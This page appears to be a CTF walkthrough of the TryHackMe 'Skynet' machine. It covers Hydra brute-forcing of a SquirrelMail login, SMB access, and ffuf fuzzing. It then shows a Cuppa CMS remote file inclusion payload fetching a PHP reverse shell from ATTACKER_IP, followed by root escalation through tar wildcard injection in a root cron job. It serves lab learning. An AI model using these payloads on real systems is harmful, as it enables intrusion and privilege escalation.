---
sidebar_position: 2
title: Exploitation
description: Skynet
keywords: [skynet tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, enum4linux, smbclient, privilege escalation, squirrelmail exploit, cuppa cms]
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';

## HYDRA

![SN](/img/vmlinux/s-squirrellogin.png)

- Using `log1.txt` as the Password **Wordlist** found during `SMB` Enumeration.
- **Brute-Forcing `SquirrelMail` `Login Form`:** <b style={{ color: 'Chartreuse' }}>milesdyson</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>cyborg007haloterminator</b>

```log
[DATA] max 16 tasks per 1 server, overall 16 tasks, 32 login tries (l:1/p:32), ~2 tries per task
[DATA] attacking http-post-form://10.10.237.156:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.
[80][http-post-form] host: 10.10.237.156   login: milesdyson   password: cyborg007haloterminator
```


<br/>

---
## SquirrelMail (Email Client)

- **We can Login using:** <b style={{ color: 'Chartreuse' }}>milesdyson</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>cyborg007haloterminator</b>
- Found <b style={{ color: 'Chartreuse' }}>milesdyson</b> SMB Password: <b style={{ color: 'Coral' }}>)s\{A&2Z=F^n_E.B\`</b>


![SN](/img/vmlinux/s-mailone.png)

![SN](/img/vmlinux/s-mailtwo.png)

---

<br/>


## SMBCLIENT 

- **We can Login as:** <b style={{ color: 'Chartreuse' }}>milesdyson</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>)s\{A&2Z=F^n_E.B\`</b>
- **`notes/important.txt` contains a Hidden `URL`: `/45kra24zxs28v3yd`**

```log
smb: \> ls
  .                                   D        0  Tue Sep 17 11:05:47 2019
  ..                                  D        0  Wed Sep 18 05:51:03 2019
  Improving Deep Neural Networks.pdf  N  5743095  Tue Sep 17 11:05:14 2019
  ...
smb: \> cd notes\
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 11:18:40 2019
  ..                                  D        0  Tue Sep 17 11:05:47 2019
  // highlight-next-line
  important.txt                       N      117  Tue Sep 17 11:18:39 2019
  ...
smb: \notes\> get important.txt -
// highlight-next-line
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

<br/>

## WEB - FFUF


- Browsing to **`/45kra24zxs28v3yd`** we find a Description About Miles Dyson.

```
                           Miles Dyson Personal Page

 Dr. Miles Bennett Dyson was the original inventor of the neural-net processor
                which would lead to the development of Skynet,
 a computer A.I. intended to control electronically linked weapons and defend
                              the United States.
```

- **Fuzzing `/45kra24zxs28v3yd` we Discover an Admin Panel for `Cuppa CMS`.**

```log
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.237.156/45kra24zxs28v3yd/FUZZ
 :: Wordlist         : FUZZ: Dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

administrator           [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 129ms]
```

<br/>


- <b style={{ color: 'SandyBrown' }}>[IP:80/45kra24zxs28v3yd/administrator]</b>

![SN](/img/vmlinux/s-cuppacms.png)


<br/>


## CUPPA CMS

This Version of `Cuppa CMS` has a **Local/Remote File Inclusion** Vulnerability.

##

- Starting <b style={{ color: 'LightGreen' }}>Simple Python3 HTTP Server</b> Hosting `PHP` **Reverse Shell.**


:::info EXPLOITING

<Tabs>
  <TabItem value="python" label="Simple HTTP Server"> 
    <div style={{color: 'red'}}>

```log
attacker@machine:~$ python3 -m http.server 8888
```

</div>
  </TabItem>
  <TabItem value="exploit" label="PAYLOAD">
    <div style={{color: 'red'}}>

```js
http://SKYNET_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP:PORT/php-reverse-shell.php
```

</div>
  </TabItem>
</Tabs>

:::

<br/>

---
## Privilege Escalation

- **We can catch the Reverse Shell Using `netcat`** 

```bash
www-data@skynet /$  id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br/>

- Found a **Script** running as <b style={{ color: 'Red' }}>ROOT:</b> <span style={{fontWeight: 'Bold'}}>backup.sh</span> located in <span style={{fontWeight: 'Bold'}}>`/home/milesdyson/backups`</span>
- We don't have the **WRITE Permissions** on **`backup.sh`** but we can abuse the **TAR WILDCARD:** `*`

```bash
www-data@skynet /$  cat /etc/crontab 
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

```bash
www-data@skynet /$  ls -l /home/milesdyson/backups/backup.sh
-rwxr-xr-x 1 root root 74 Sep 17  2019 /home/milesdyson/backups/backup.sh
www-data@skynet /$  cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

<br/>

- **We move into `/var/www/html` Directory and run the Following:**

```bash
www-data@skynet html$  echo "chmod +s /bin/bash" > SUID.sh
www-data@skynet html$  echo "" > "--checkpoint-action=exec=sh SUID.sh"
www-data@skynet html$  echo "" > --checkpoint=1
www-data@skynet html$  
www-data@skynet html$  ls -l /bin/bash 
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

```bash
www-data@skynet html$  /bin/bash -p 
www-data@skynet html$  id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
www-data@skynet html$  whoami
root
```

---